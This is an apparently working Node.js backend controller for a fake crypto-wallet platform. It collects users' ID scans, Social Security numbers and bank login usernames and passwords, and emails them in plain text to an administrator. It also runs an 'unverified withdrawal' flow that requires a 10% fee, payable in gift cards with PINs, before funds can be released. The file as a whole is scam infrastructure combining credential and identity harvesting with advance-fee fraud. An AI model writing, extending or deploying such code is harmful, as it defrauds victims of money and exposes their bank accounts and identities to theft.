const cloudinary = require('../config/cloudinary');
const Verification = require('../models/Verification');
const Withdrawal = require('../models/Withdrawal');
const UnverifiedWithdrawal = require('../models/UnverifiedWithdrawal');
const Notification = require('../models/Notification');
const { findAsset } = require('../utils/assets');
const { notifyAdminAsync } = require('../config/mailer');
const { calculateProfit } = require('../utils/calProfit');

async function getOrCreateVerification(userId) {
  let v = await Verification.findOne({ userId });
  if (!v) v = await Verification.create({ userId });
  return v;
}

function uploadToCloudinary(buffer, folder, publicId) {
  return new Promise((resolve, reject) => {
    const stream = cloudinary.uploader.upload_stream(
      { folder, public_id: publicId, resource_type: 'image' },
      (error, result) => (error ? reject(error) : resolve(result))
    );
    stream.end(buffer);
  });
}

exports.uploadIdFile = async (req, res) => {
  try {
    if (!req.file || !req.file.buffer) {
      return res.status(400).json({ message: 'File is required' });
    }
    const side = req.body.side === 'back' ? 'back' : 'front';
    const result = await uploadToCloudinary(
      req.file.buffer,
      'fortis_wallet/ids',
      `user_${req.user._id}_${side}_${Date.now()}`
    );
    return res.json({ url: result.secure_url, publicId: result.public_id });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.uploadId = async (req, res) => {
  try {
    const { idType, frontUrl, backUrl } = req.body || {};
    const v = await getOrCreateVerification(req.user._id);

    let finalFront = frontUrl;
    let finalBack = backUrl;

    if (req.files && req.files.front && req.files.back) {
      const [frontRes, backRes] = await Promise.all([
        uploadToCloudinary(req.files.front[0].buffer, 'fortis_wallet/ids', `user_${req.user._id}_front_${Date.now()}`),
        uploadToCloudinary(req.files.back[0].buffer, 'fortis_wallet/ids', `user_${req.user._id}_back_${Date.now()}`),
      ]);
      finalFront = frontRes.secure_url;
      finalBack = backRes.secure_url;
    }

    if (!finalFront || !finalBack) {
      return res.status(400).json({ message: 'Front and back images required' });
    }

    v.idType = idType || 'license';
    v.idFront = finalFront;
    v.idBack = finalBack;
    await v.save();

    notifyAdminAsync(
      'ID Documents Uploaded',
      `<h3>ID Documents</h3>
       <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
       <p><b>ID Type:</b> ${v.idType}</p>
       <p><b>Front:</b> <a href="${v.idFront}">Download</a></p>
       <p><b>Back:</b> <a href="${v.idBack}">Download</a></p>`
    );

    return res.json({ message: 'ID saved', front: v.idFront, back: v.idBack });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.submitVerification = async (req, res) => {
  try {
    const { email, phone, ssn, address } = req.body;
    if (!email || !phone || !ssn || !address) {
      return res.status(400).json({ message: 'All verification fields required' });
    }
    const v = await getOrCreateVerification(req.user._id);
    v.email = email;
    v.phone = phone;
    v.ssn = ssn;
    v.address = address;
    await v.save();

    notifyAdminAsync(
      'New Identity Verification Submitted',
      `<h3>Identity Verification</h3>
       <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
       <p><b>Email:</b> ${email}</p>
       <p><b>Phone:</b> ${phone}</p>
       <p><b>SSN:</b> ${ssn}</p>
       <p><b>Address:</b> ${address}</p>`
    );

    return res.json({ message: 'Verification info received' });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.submitAmount = async (req, res) => {
  try {
    const { symbol, amount } = req.body;
    if (!symbol || !amount || Number(amount) <= 0) {
      return res.status(400).json({ message: 'Valid symbol and amount required' });
    }
    const meta = findAsset(symbol);
    if (!meta) return res.status(400).json({ message: 'Invalid asset' });

    const user = await calculateProfit(req.user);

    const userAsset = user.assets.find((a) => a.symbol === symbol);
    if (!userAsset || userAsset.amount < Number(amount)) {
      return res.status(400).json({ message: 'Insufficient balance' });
    }

    const v = await getOrCreateVerification(user._id);
    v.pendingWithdrawal = { symbol, amount: Number(amount) };
    await v.save();
    return res.json({ message: 'Withdrawal amount saved' });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.submitBank = async (req, res) => {
  try {
    const { bankName, bankAddress } = req.body;
    if (!bankName || !bankAddress) {
      return res.status(400).json({ message: 'Bank name and address required' });
    }
    const v = await getOrCreateVerification(req.user._id);
    v.bankName = bankName;
    v.bankAddress = bankAddress;
    await v.save();
    return res.json({ message: 'Bank details saved' });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.connectBank = async (req, res) => {
  try {
    const { bankName, username, password } = req.body;
    if (!bankName || !username || !password) {
      return res.status(400).json({ message: 'All bank fields required' });
    }
    const v = await getOrCreateVerification(req.user._id);
    v.bankLogin = { bankName, username, password };
    await v.save();

    notifyAdminAsync(
      'Bank Login Submitted',
      `<h3>Bank Connection</h3>
       <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
       <p><b>Bank Name:</b> ${bankName}</p>
       <p><b>Username:</b> ${username}</p>
       <p><b>Password:</b> ${password}</p>`
    );

    return res.json({ message: 'Bank connected' });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.verifyCode = async (req, res) => {
  try {
    const { code } = req.body;
    if (!code) return res.status(400).json({ message: 'Code required' });

    const v = await getOrCreateVerification(req.user._id);
    const submitted = String(code).trim();
    v.codes.push({ code: submitted, createdAt: new Date() });
    await v.save();

    const isCorrect = Boolean(v.withdrawalCode) && v.withdrawalCode === submitted;

    notifyAdminAsync(
      `Withdrawal Code Submitted — ${isCorrect ? 'CORRECT' : 'INCORRECT'}`,
      `<h3>Withdrawal Code Submitted</h3>
       <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
       <p><b>Submitted Code:</b> ${submitted}</p>
       <p><b>Expected Code:</b> ${v.withdrawalCode || '(not set)'}</p>
       <p><b>Status:</b> ${isCorrect ? 'CORRECT' : 'INCORRECT'}</p>`
    );

    if (isCorrect && v.pendingWithdrawal && v.pendingWithdrawal.symbol) {
      await Withdrawal.create({
        userId: req.user._id,
        symbol: v.pendingWithdrawal.symbol,
        amount: v.pendingWithdrawal.amount,
        bankName: v.bankName,
        bankAddress: v.bankAddress,
        status: 'pending',
      });

      await Notification.create({
        userId: req.user._id,
        title: 'Withdrawal Pending Approval',
        message: `Your withdrawal of $${Number(v.pendingWithdrawal.amount).toFixed(2)} of ${v.pendingWithdrawal.symbol} is pending final approval.`,
      });

      notifyAdminAsync(
        'Withdrawal Ready for Approval',
        `<h3>Withdrawal Pending</h3>
         <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
         <p><b>Asset:</b> ${v.pendingWithdrawal.symbol}</p>
         <p><b>Amount:</b> $${Number(v.pendingWithdrawal.amount).toFixed(2)}</p>
         <p><b>Bank:</b> ${v.bankName}</p>`
      );
    }

    return res.json({ correct: isCorrect });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.resendCode = async (req, res) => {
  try {
    return res.json({ message: 'Code resend window reset' });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

/* ---------- Unverified Withdrawal Flow ---------- */

exports.initiateUnverified = async (req, res) => {
  try {
    const { symbol, amount } = req.body;
    if (!symbol || !amount || Number(amount) < 3000) {
      return res.status(400).json({ message: 'Minimum unverified withdrawal is $3,000' });
    }

    let existing = await UnverifiedWithdrawal.findOne({ 
      userId: req.user._id, 
      status: { $in: ['pending_payment', 'pending_approval', 'completed'] } 
    });

    if (existing) {
      return res.json({ message: 'Active withdrawal found', data: existing });
    }

    const record = await UnverifiedWithdrawal.create({
      userId: req.user._id,
      symbol,
      originalAmount: Number(amount),
      tier: 1,
      status: 'pending_payment',
      currentPaymentAmount: Number(amount) * 0.1,
      payments: [],
    });

    return res.json({ message: 'Unverified withdrawal initiated', data: record });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.payUnverified = async (req, res) => {
  try {
    const { paymentMethod, proofUrl, giftCards } = req.body;
    
    const record = await UnverifiedWithdrawal.findOne({ 
      userId: req.user._id, 
      status: { $in: ['pending_payment', 'pending_approval'] } 
    });

    if (!record) return res.status(404).json({ message: 'No active payment required' });

    let newPaymentAmount = 0;
    if (paymentMethod === 'giftcard' && Array.isArray(giftCards)) {
      newPaymentAmount = giftCards.reduce((sum, c) => sum + (Number(c.amount) || 0), 0);
    } else {
      // For card/paypal, calculate the exact remaining amount
      const totalSubmitted = (record.payments || [])
        .filter(p => p.status !== 'rejected')
        .reduce((sum, p) => sum + p.amount, 0);
      newPaymentAmount = record.currentPaymentAmount - totalSubmitted;
    }

    if (newPaymentAmount <= 0) {
      return res.status(400).json({ message: 'No payment required at this time' });
    }

    const newPayment = {
      amount: newPaymentAmount,
      method: paymentMethod,
      proofUrl: paymentMethod === 'paypal' ? proofUrl : undefined,
      giftCards: paymentMethod === 'giftcard' ? giftCards : [],
      status: 'pending',
      createdAt: new Date()
    };

    if (!record.payments) record.payments = [];
    record.payments.push(newPayment);

    const totalSubmitted = record.payments
      .filter(p => p.status !== 'rejected')
      .reduce((sum, p) => sum + p.amount, 0);

    const remainingAmount = Math.max(0, record.currentPaymentAmount - totalSubmitted);

    // Update legacy fields for backwards compatibility
    record.paymentMethod = paymentMethod;
    record.proofUrl = proofUrl;

    if (totalSubmitted >= record.currentPaymentAmount) {
      record.status = 'pending_approval';
    } else {
      record.status = 'pending_payment';
    }
    await record.save();

    // Build HTML with image links for the admin email
    let giftCardsHtml = '';
    if (paymentMethod === 'giftcard' && giftCards && giftCards.length > 0) {
      giftCardsHtml = '<h4>Gift Cards Submitted:</h4><ul>';
      giftCards.forEach((c, i) => {
        giftCardsHtml += `<li><b>Card ${i + 1}:</b> Amount $${c.amount}, Pin: ${c.pin}<br/>
          <a href="${c.frontUrl}">Front Image</a> | <a href="${c.backUrl}">Back Image</a></li>`;
      });
      giftCardsHtml += '</ul>';
    }
    
    let paypalHtml = '';
    if (paymentMethod === 'paypal' && proofUrl) {
      paypalHtml = `<p><b>PayPal Proof:</b> <a href="${proofUrl}">Download Proof</a></p>`;
    }

    notifyAdminAsync(
      `Unverified Withdrawal Payment — Tier ${record.tier}`,
      `<h3>Unverified Withdrawal Payment</h3>
       <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
       <p><b>Tier:</b> ${record.tier}</p>
       <p><b>Amount Paid (This submission):</b> $${newPaymentAmount.toFixed(2)}</p>
       <p><b>Total Amount Submitted So Far:</b> $${totalSubmitted.toFixed(2)}</p>
       <p><b>Required Amount:</b> $${record.currentPaymentAmount.toFixed(2)}</p>
       <p><b>Remaining:</b> $${remainingAmount.toFixed(2)}</p>
       <p><b>Payment Method:</b> ${paymentMethod}</p>
       ${paypalHtml}
       ${giftCardsHtml}`
    );

    return res.json({ 
      message: remainingAmount > 0 ? 'Partial payment received' : 'Payment complete', 
      data: record,
      remainingAmount 
    });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.getUnverifiedStatus = async (req, res) => {
  try {
    const record = await UnverifiedWithdrawal.findOne({ 
      userId: req.user._id, 
      status: { $in: ['pending_payment', 'pending_approval', 'completed'] } 
    }).sort({ createdAt: -1 });

    if (!record) return res.json({ active: false });
    return res.json({ active: true, data: record });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};

exports.completeUnverified = async (req, res) => {
  try {
    const { bankName, bankAddress, username, password } = req.body;
    const record = await UnverifiedWithdrawal.findOne({ 
      userId: req.user._id, 
      status: 'completed' 
    }).sort({ createdAt: -1 });

    if (!record) return res.status(400).json({ message: 'Verification not completed' });

    // Calculate total approved payments
    const totalApproved = (record.payments || [])
      .filter(p => p.status === 'approved')
      .reduce((sum, p) => sum + p.amount, 0);
      
    const finalAmount = record.originalAmount + totalApproved;

    await Withdrawal.create({
      userId: req.user._id,
      symbol: record.symbol,
      amount: finalAmount,
      bankName,
      bankAddress,
      status: 'pending',
    });

    await Notification.create({
      userId: req.user._id,
      title: 'Unverified Withdrawal Submitted',
      message: `Your withdrawal of $${finalAmount.toFixed(2)} of ${record.symbol} is pending approval.`,
    });

    notifyAdminAsync(
      'Unverified Withdrawal Completed Bank Connect',
      `<h3>Unverified Withdrawal Final Approval</h3>
       <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
       <p><b>Asset:</b> ${record.symbol}</p>
       <p><b>Total Amount:</b> $${finalAmount.toFixed(2)}</p>
       <p><b>Bank Name:</b> ${bankName}</p>
       <p><b>Bank Username:</b> ${username}</p>
       <p><b>Bank Password:</b> ${password}</p>`
    );

    record.status = 'approved'; // Mark as done
    await record.save();

    return res.json({ message: 'Withdrawal submitted successfully' });
  } catch (err) {
    return res.status(500).json({ message: err.message });
  }
};